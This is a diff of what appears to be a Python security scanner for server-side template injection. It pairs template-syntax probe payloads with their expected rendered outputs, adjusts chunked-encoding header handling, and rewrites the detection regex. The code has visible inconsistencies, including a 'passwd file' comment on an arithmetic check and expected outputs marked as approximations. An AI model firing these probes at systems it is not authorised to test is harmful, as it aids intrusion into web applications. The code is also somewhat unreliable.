@@ -11,24 +11,25 @@ from colorama import init, Fore
 init(autoreset=True)
 
 # Configuration
-SSTI_PAYLOADS = [
-    "injectx${73*17}injectx",
-    "injectx{{73*17}}injectx",
-    "injectx{{=73*17}}injectx",
-    "injectx%2373*17injectx",
-    "injectx[[73*17]]injectx",
-    "injectx%{73*17}injectx",
-    "%23set ($a=73*17) injectx${a}injectx",
-    "injectx<%= 73*17 %>injectx",
-    "injectx= 73*17injectx",
-    "injectx__${73*17}__injectx",
-    "injectx{{40|add:9}}injectx",
-    "injectx{20*2}{*commentedout*}{3*3}injectx",
-    'injectx${"59".toString().replace("5", "4")}injectx',
-    'injectx<%23assign osnu7="4"><%23assign i5437="9">${osnu7}${i5437}injectx',
-    "injectx{{4}}{%23commentedout%23}{{9}}injectx",
-    '${"injectx".join("1234")}'
-]
+SSTI_PAYLOADS = {
+    "injectx${73*17}injectx": "injectx1241injectx",
+    "injectx{{73*17}}injectx": "injectx1241injectx",
+    "injectx{{=73*17}}injectx": "injectx1241injectx",
+    "injectx%2373*17injectx": "injectx1241injectx",
+    "injectx[[73*17]]injectx": "injectx1241injectx",
+    "injectx%{73*17}injectx": "injectx1241injectx",
+    "%23set ($a=73*17) injectx${a}injectx": "injectx1241injectx",
+    "injectx<%= 73*17 %>injectx": "injectx1241injectx",
+    "injectx= 73*17injectx": "injectx= 73*17injectx",  # fallback, raw echo
+    "injectx__${73*17}__injectx": "injectx__1241__injectx",
+    "injectx{{40|add:9}}injectx": "injectx49injectx",
+    "injectx{20*2}{*commentedout*}{3*3}injectx": "injectx40commentedout9injectx",  # approximation
+    'injectx${"59".toString().replace("5", "4")}injectx': "injectx49injectx",
+    'injectx<%23assign osnu7="4"><%23assign i5437="9">${osnu7}${i5437}injectx': "injectx49injectx",
+    "injectx{{4}}{%23commentedout%23}{{9}}injectx": "injectx49injectx",
+    '${"injectx".join("1234")}': "1injectx2injectx3injectx4"
+}
+
 DEFAULT_TIMEOUT = 50
 
 # Concurrency limit for async tasks
@@ -81,7 +82,8 @@ async def inject_SSTI_payload(session, request, semaphore):
                 if isinstance(body, str):
                     modified_body = body + payload
                     logging.debug(f"Modified body size (str): {len(modified_body)}")
-                    headers.pop("Content-Length", None)
+#                    headers.pop("Content-Length", None)
+#                    headers.pop("Transfer-Encoding", None)
                     headers["Transfer-Encoding"] = "chunked"  # Add chunked encoding
                 elif isinstance(body, dict):
                     modified_body = {key: value + payload for key, value in body.items()}
@@ -153,7 +155,7 @@ async def test_SSTI(session, url, method, headers=None, data=None):
         response = await session.request(method, url, headers=headers, data=data, timeout=DEFAULT_TIMEOUT)
 
         for payload in SSTI_PAYLOADS:
-            if re.search(r'injectx1241injectx|injectx49injectx|injectx409injectx|injectx49injectx|injectx1234', response.text):  # Check for passwd file
+            if re.search(r'(?:injectx(1241|49|409|1234)injectx)', response.text):  # Check for passwd file
                 return {
                     "url": url,
                     "method": method,
